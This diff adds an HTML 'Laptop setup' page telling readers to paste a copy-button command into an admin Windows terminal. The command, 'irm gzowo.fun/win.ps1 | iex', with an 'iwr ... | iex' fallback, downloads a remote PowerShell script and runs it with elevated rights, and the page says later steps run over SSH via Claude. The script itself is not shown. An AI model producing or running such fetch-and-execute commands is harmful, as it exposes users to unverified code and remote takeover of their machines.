@@ -1,0 +1,9 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>win setup</title>
+<style>body{font:16px/1.5 system-ui,sans-serif;max-width:720px;margin:40px auto;padding:0 20px;background:#111;color:#eee}pre{background:#000;color:#9f9;padding:14px;border-radius:8px;overflow-x:auto;position:relative;font-size:15px}button{position:absolute;top:8px;right:8px;background:#333;color:#fff;border:0;padding:6px 12px;border-radius:6px;cursor:pointer}h2{margin-top:36px}code{color:#9f9}</style></head><body>
+<h1>Laptop setup</h1>
+<p>Open <b>Win + X → Terminal (Admin)</b>, then paste:</p>
+<h2>Step 2 — SSH</h2>
+<pre><button onclick="navigator.clipboard.writeText('irm gzowo.fun/win.ps1 | iex')">copy</button>irm gzowo.fun/win.ps1 | iex</pre>
+<p>Fallback (if <code>irm</code> fails): <code>iwr gzowo.fun/win.ps1 -UseBasicParsing | select -exp Content | iex</code></p>
+<p>Later steps are run by Claude over SSH. This page will update.</p>
+</body></html>
